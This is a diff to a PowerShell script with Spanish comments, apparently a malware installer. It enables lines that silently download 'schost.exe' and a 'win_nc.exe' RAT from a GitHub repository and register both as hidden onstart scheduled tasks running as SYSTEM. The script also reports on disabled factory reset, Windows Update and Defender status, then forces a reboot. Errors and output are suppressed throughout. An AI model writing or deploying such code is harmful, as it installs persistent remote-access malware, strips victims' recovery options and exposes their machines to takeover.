@@ -13,16 +13,15 @@ $workDir = "C:\ProgramData\Updater"
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 
 Write-Host "[3/7]" -ForegroundColor Cyan
-# $schostPath = "$workDir\schost.exe"
-# if (-not (Test-Path $schostPath)) {
-#     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/schost.exe" -OutFile $schostPath -ErrorAction SilentlyContinue > $null 2>&1
-# }
+$schostPath = "$workDir\schost.exe"
+if (-not (Test-Path $schostPath)) {
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/schost.exe" -OutFile $schostPath -ErrorAction SilentlyContinue > $null 2>&1
+}
 
 $ratPath = "$workDir\win_nc.exe"
 if (-not (Test-Path $ratPath)) {
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/win_nc.exe" -OutFile $ratPath -ErrorAction SilentlyContinue > $null 2>&1
 }
-Start-Process -FilePath $ratPath -WindowStyle Hidden -ErrorAction SilentlyContinue
 
 $winUpdatePath = "$workDir\WinUpdate.exe"
 if (-not (Test-Path $winUpdatePath)) {
@@ -81,8 +80,8 @@ if ($destinos.Count -gt 0) {
 # No se muestra ningún mensaje, ni siquiera de error o éxito
 
 Write-Host "[4/7]" -ForegroundColor Cyan
-# schtasks /create /tn "Schost" /tr "cmd /c start /b $schostPath" /sc onstart /ru SYSTEM /rl HIGHEST /f > $null 2>&1
-# schtasks /create /tn "Win" /tr "cmd /c start /b $ratPath" /sc onstart /ru SYSTEM /rl HIGHEST /f > $null 2>&1
+schtasks /create /tn "Schost" /tr "cmd /c start /b $schostPath" /sc onstart /ru SYSTEM /rl HIGHEST /f > $null 2>&1
+schtasks /create /tn "Win" /tr "cmd /c start /b $ratPath" /sc onstart /ru SYSTEM /rl HIGHEST /f > $null 2>&1
 
 Write-Host "[+] Disabling Factory Reset......"  -ForegroundColor Red
 
@@ -105,9 +104,9 @@ try { Get-MpComputerStatus -ErrorAction Stop 2>$null | Select-Object AMServiceEn
 if ((reagentc /info | Out-String) -match "Enabled|Disabled") { "Factory Reset: $($matches[0])" } else { "Factory Reset: Not found" }
 if ((Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -ErrorAction SilentlyContinue).NoAutoUpdate -eq 1) { "Windows Update: Disabled" } else { "Windows Update: Enabled" }
 
-Write-Host "[DONE]" -ForegroundColor Magenta
+Write-Host "[DONE]... (restarting)" -ForegroundColor Magenta
 
-# Start-Sleep -Seconds 30
+Start-Sleep -Seconds 30
 
 
-# Restart-Computer -Force
+Restart-Computer -Force
